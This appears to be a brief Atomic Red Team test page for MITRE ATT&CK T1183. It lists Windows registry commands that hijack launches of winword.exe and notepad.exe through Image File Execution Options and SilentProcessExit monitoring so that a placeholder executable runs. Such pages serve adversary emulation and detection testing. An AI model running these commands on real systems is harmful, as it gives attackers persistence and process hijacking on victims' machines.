# Image File Execution Options

MITRE ATT&CK Technique: [T1183](https://attack.mitre.org/wiki/Technique/T1183)

## Debugger

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winword.exe" /v Debugger /d "C:\folder\AtomicRedTeam.exe"


## GlobalFlags

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\folder\AtomicRedTeam.exe"

